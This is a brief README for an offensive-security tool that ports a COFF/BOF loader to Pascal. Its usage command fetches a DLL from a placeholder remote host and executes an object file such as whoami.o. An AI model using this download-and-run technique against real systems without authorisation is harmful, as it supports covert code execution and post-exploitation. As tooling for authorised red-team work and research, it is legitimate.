
## Offsec Pascal 

The first ported COFF loader into Pascal Language, it is easier now with the DLL release from sliverarmy fork to integrate Object files with out rewrite the 
whole COFF Loader. 

## what i have did new? 

* the version ported from the following nim project () 
* make sure to host the COFFLoader.x64.dll into your remote host 
* the loader can fetch the remote dll and then load it. 


## usage 

* host your compiled DLL into your remote host, i have attached DLL copied from Lazy-nim github repo,
you can get yours from the following repo https://github.com/sliverarmory/COFFLoader/
* execute the loader 

```
project.exe -o whoami.o -u http://REMOTE/DLLNAME 

```

## Thanks

* https://github.com/sliverarmory/COFFLoader/
* https://github.com/zimnyaa/nim-lazy-bof/tree/main 
* https://github.com/trustedsec/COFFLoader

